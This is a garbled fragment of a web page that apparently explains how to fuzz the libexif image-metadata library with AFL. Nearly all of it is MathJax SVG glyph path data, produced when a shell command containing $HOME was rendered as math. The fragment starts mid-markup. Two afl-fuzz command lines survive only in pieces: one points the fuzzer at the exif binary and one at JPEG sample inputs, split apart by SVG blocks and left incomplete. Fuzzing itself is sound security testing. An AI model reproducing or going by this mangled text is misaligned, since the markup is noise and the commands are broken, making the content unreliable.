<path stroke-width="1" id="E1-MJMATHI-62" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"/>
<path stroke-width="1" id="E1-MJMATHI-65" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"/>
<path stroke-width="1" id="E1-MJMATHI-78" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"/>
<path stroke-width="1" id="E1-MJMAIN-2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"/>
<path stroke-width="1" id="E1-MJMATHI-73" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"/>
<path stroke-width="1" id="E1-MJMATHI-61" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"/>
<path stroke-width="1" id="E1-MJMATHI-6D" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"/>
<path stroke-width="1" id="E1-MJMATHI-70" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"/>
<path stroke-width="1" id="E1-MJMATHI-74" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"/>
<path stroke-width="1" id="E1-MJMATHI-72" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"/>
<path stroke-width="1" id="E1-MJMATHI-6A" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"/>
<path stroke-width="1" id="E1-MJMATHI-6F" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"/>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-48" x="0" y="0"/>
 <use xlink:href="#E1-MJMATHI-4F" x="888" y="0"/>
 <use xlink:href="#E1-MJMATHI-4D" x="1652" y="0"/>
 <use xlink:href="#E1-MJMATHI-45" x="2703" y="0"/>
 <use xlink:href="#E1-MJMAIN-2F" x="3468" y="0"/>
 <use xlink:href="#E1-MJMATHI-66" x="3968" y="0"/>
 <use xlink:href="#E1-MJMATHI-75" x="4519" y="0"/>
 <use xlink:href="#E1-MJMATHI-7A" x="5091" y="0"/>
 <use xlink:href="#E1-MJMATHI-7A" x="5560" y="0"/>
 <use xlink:href="#E1-MJMATHI-69" x="6028" y="0"/>
 <use xlink:href="#E1-MJMATHI-6E" x="6374" y="0"/>
<g transform="translate(6974,0)">
 <use xlink:href="#E1-MJMATHI-67" x="0" y="0"/>
 <use transform="scale(0.707)" xlink:href="#E1-MJMATHI-6C" x="675" y="-213"/>
</g>
 <use xlink:href="#E1-MJMATHI-69" x="7763" y="0"/>
 <use xlink:href="#E1-MJMATHI-62" x="8108" y="0"/>
 <use xlink:href="#E1-MJMATHI-65" x="8538" y="0"/>
 <use xlink:href="#E1-MJMATHI-78" x="9004" y="0"/>
 <use xlink:href="#E1-MJMATHI-69" x="9577" y="0"/>
 <use xlink:href="#E1-MJMATHI-66" x="9922" y="0"/>
 <use xlink:href="#E1-MJMAIN-2F" x="10473" y="0"/>
 <use xlink:href="#E1-MJMATHI-65" x="10973" y="0"/>
 <use xlink:href="#E1-MJMATHI-78" x="11440" y="0"/>
 <use xlink:href="#E1-MJMATHI-69" x="12012" y="0"/>
 <use xlink:href="#E1-MJMATHI-66" x="12358" y="0"/>
 <use xlink:href="#E1-MJMAIN-2212" x="13130" y="0"/>
 <use xlink:href="#E1-MJMATHI-73" x="14131" y="0"/>
 <use xlink:href="#E1-MJMATHI-61" x="14601" y="0"/>
 <use xlink:href="#E1-MJMATHI-6D" x="15130" y="0"/>
 <use xlink:href="#E1-MJMATHI-70" x="16009" y="0"/>
 <use xlink:href="#E1-MJMATHI-6C" x="16512" y="0"/>
 <use xlink:href="#E1-MJMATHI-65" x="16811" y="0"/>
 <use xlink:href="#E1-MJMATHI-73" x="17277" y="0"/>
 <use xlink:href="#E1-MJMAIN-2212" x="17969" y="0"/>
 <use xlink:href="#E1-MJMATHI-6D" x="18969" y="0"/>
 <use xlink:href="#E1-MJMATHI-61" x="19848" y="0"/>
 <use xlink:href="#E1-MJMATHI-73" x="20377" y="0"/>
 <use xlink:href="#E1-MJMATHI-74" x="20847" y="0"/>
 <use xlink:href="#E1-MJMATHI-65" x="21208" y="0"/>
 <use xlink:href="#E1-MJMATHI-72" x="21675" y="0"/>
 <use xlink:href="#E1-MJMAIN-2F" x="22126" y="0"/>
 <use xlink:href="#E1-MJMATHI-6A" x="22627" y="0"/>
 <use xlink:href="#E1-MJMATHI-70" x="23039" y="0"/>
 <use xlink:href="#E1-MJMATHI-67" x="23543" y="0"/>
 <use xlink:href="#E1-MJMAIN-2F" x="24023" y="0"/>
 <use xlink:href="#E1-MJMAIN-2212" x="24746" y="0"/>
 <use xlink:href="#E1-MJMATHI-6F" x="25747" y="0"/>
</g>
</svg>HOME/fuzzing_libexif/out/ -M fuzzer1 -- <span class="hljs-variable">$HOME</span>/fuzzing_libexif/install/bin/exif @@<br><br>sudo /home/shoucheng/fuzz/AFL/afl-fuzz -i <svg xmlns:xlink="http://www.w3.org/1999/xlink" width="60.928ex" height="2.843ex" style="vertical-align: -0.838ex;" viewbox="0 -863.1 26232.9 1223.9" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">HOME/fuzzing_libexif/exif-samples-master/jpg/ -o </title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-48" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 219 683Q260 681 355 681Q389 681 418 681T463 682T483 682Q499 682 499 672Q499 670 497 658Q492 641 487 638H485Q483 638 480 638T473 638T464 637T455 637Q416 636 405 634T387 623Q384 619 355 500Q348 474 340 442T328 395L324 380Q324 378 469 378H614L615 381Q615 384 646 504Q674 619 674 627T617 637Q594 637 587 639T580 648Q580 650 582 660Q586 677 588 679T604 682Q609 682 646 681T740 680Q802 680 835 681T871 682Q888 682 888 672Q888 645 876 638H874Q872 638 869 638T862 638T853 637T844 637Q805 636 794 634T776 623Q773 618 704 340T634 58Q634 51 638 51Q646 48 692 46H723Q729 38 729 37T726 19Q722 6 716 0H701Q664 2 567 2Q533 2 504 2T458 2T437 1Q420 1 420 10Q420 15 423 24Q428 43 433 45Q437 46 448 46H454Q481 46 514 49Q520 50 522 50T528 55T534 64T540 82T547 110T558 153Q565 181 569 198Q602 330 602 331T457 332H312L279 197Q245 63 245 58Q245 51 253 49T303 46H334Q340 38 340 37T337 19Q333 6 327 0H312Q275 2 178 2Q144 2 115 2T69 2T48 1Q31 1 31 10Q31 12 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z"/>
<path stroke-width="1" id="E1-MJMATHI-4F" d="M740 435Q740 320 676 213T511 42T304 -22Q207 -22 138 35T51 201Q50 209 50 244Q50 346 98 438T227 601Q351 704 476 704Q514 704 524 703Q621 689 680 617T740 435ZM637 476Q637 565 591 615T476 665Q396 665 322 605Q242 542 200 428T157 216Q157 126 200 73T314 19Q404 19 485 98T608 313Q637 408 637 476Z"/>
<path stroke-width="1" id="E1-MJMATHI-4D" d="M289 629Q289 635 232 637Q208 637 201 638T194 648Q194 649 196 659Q197 662 198 666T199 671T201 676T203 679T207 681T212 683T220 683T232 684Q238 684 262 684T307 683Q386 683 398 683T414 678Q415 674 451 396L487 117L510 154Q534 190 574 254T662 394Q837 673 839 675Q840 676 842 678T846 681L852 683H948Q965 683 988 683T1017 684Q1051 684 1051 673Q1051 668 1048 656T1045 643Q1041 637 1008 637Q968 636 957 634T939 623Q936 618 867 340T797 59Q797 55 798 54T805 50T822 48T855 46H886Q892 37 892 35Q892 19 885 5Q880 0 869 0Q864 0 828 1T736 2Q675 2 644 2T609 1Q592 1 592 11Q592 13 594 25Q598 41 602 43T625 46Q652 46 685 49Q699 52 704 61Q706 65 742 207T813 490T848 631L654 322Q458 10 453 5Q451 4 449 3Q444 0 433 0Q418 0 415 7Q413 11 374 317L335 624L267 354Q200 88 200 79Q206 46 272 46H282Q288 41 289 37T286 19Q282 3 278 1Q274 0 267 0Q265 0 255 0T221 1T157 2Q127 2 95 1T58 0Q43 0 39 2T35 11Q35 13 38 25T43 40Q45 46 65 46Q135 46 154 86Q158 92 223 354T289 629Z"/>
<path stroke-width="1" id="E1-MJMATHI-45" d="M492 213Q472 213 472 226Q472 230 477 250T482 285Q482 316 461 323T364 330H312Q311 328 277 192T243 52Q243 48 254 48T334 46Q428 46 458 48T518 61Q567 77 599 117T670 248Q680 270 683 272Q690 274 698 274Q718 274 718 261Q613 7 608 2Q605 0 322 0H133Q31 0 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q146 66 215 342T285 622Q285 629 281 629Q273 632 228 634H197Q191 640 191 642T193 659Q197 676 203 680H757Q764 676 764 669Q764 664 751 557T737 447Q735 440 717 440H705Q698 445 698 453L701 476Q704 500 704 528Q704 558 697 578T678 609T643 625T596 632T532 634H485Q397 633 392 631Q388 629 386 622Q385 619 355 499T324 377Q347 376 372 376H398Q464 376 489 391T534 472Q538 488 540 490T557 493Q562 493 565 493T570 492T572 491T574 487T577 483L544 351Q511 218 508 216Q505 213 492 213Z"/>
<path stroke-width="1" id="E1-MJMAIN-2F" d="M423 750Q432 750 438 744T444 730Q444 725 271 248T92 -240Q85 -250 75 -250Q68 -250 62 -245T56 -231Q56 -221 230 257T407 740Q411 750 423 750Z"/>
<path stroke-width="1" id="E1-MJMATHI-66" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"/>
<path stroke-width="1" id="E1-MJMATHI-75" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"/>
<path stroke-width="1" id="E1-MJMATHI-7A" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z"/>
<path stroke-width="1" id="E1-MJMATHI-69" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"/>
<path stroke-width="1" id="E1-MJMATHI-6E" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"/>
<path stroke-width="1" id="E1-MJMATHI-67" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"/>
<path stroke-width="1" id="E1-MJMATHI-6C" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z"/>
<path stroke-width="1" id="E1-MJMATHI-62" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"/>
<path stroke-width="1" id="E1-MJMATHI-65" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"/>
<path stroke-width="1" id="E1-MJMATHI-78" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"/>
<path stroke-width="1" id="E1-MJMAIN-2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"/>
<path stroke-width="1" id="E1-MJMATHI-73" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"/>
<path stroke-width="1" id="E1-MJMATHI-61" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"/>
<path stroke-width="1" id="E1-MJMATHI-6D" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"/>
<path stroke-width="1" id="E1-MJMATHI-70" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"/>
<path stroke-width="1" id="E1-MJMATHI-74" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"/>
<path stroke-width="1" id="E1-MJMATHI-72" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"/>
<path stroke-width="1" id="E1-MJMATHI-6A" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"/>
<path stroke-width="1" id="E1-MJMATHI-6F" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"/>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-48" x="0" y="0"/>
 <use xlink:href="#E1-MJMATHI-4F" x="888" y="0"/>
 <use xlink:href="#E1-MJMATHI-4D" x="1652" y="0"/>
 <use xlink:href="#E1-MJMATHI-45" x="2703" y="0"/>
 <use xlink:href="#E1-MJMAIN-2F" x="3468" y="0"/>
 <use xlink:href="#E1-MJMATHI-66" x="3968" y="0"/>
 <use xlink:href="#E1-MJMATHI-75" x="4519" y="0"/>
 <use xlink:href="#E1-MJMATHI-7A" x="5091" y="0"/>
 <use xlink:href="#E1-MJMATHI-7A" x="5560" y="0"/>
 <use xlink:href="#E1-MJMATHI-69" x="6028" y="0"/>
 <use xlink:href="#E1-MJMATHI-6E" x="6374" y="0"/>
<g transform="translate(6974,0)">
 <use xlink:href="#E1-MJMATHI-67" x="0" y="0"/>
 <use transform="scale(0.707)" xlink:href="#E1-MJMATHI-6C" x="675" y="-213"/>
</g>
 <use xlink:href="#E1-MJMATHI-69" x="7763" y="0"/>
 <use xlink:href="#E1-MJMATHI-62" x="8108" y="0"/>
 <use xlink:href="#E1-MJMATHI-65" x="8538" y="0"/>
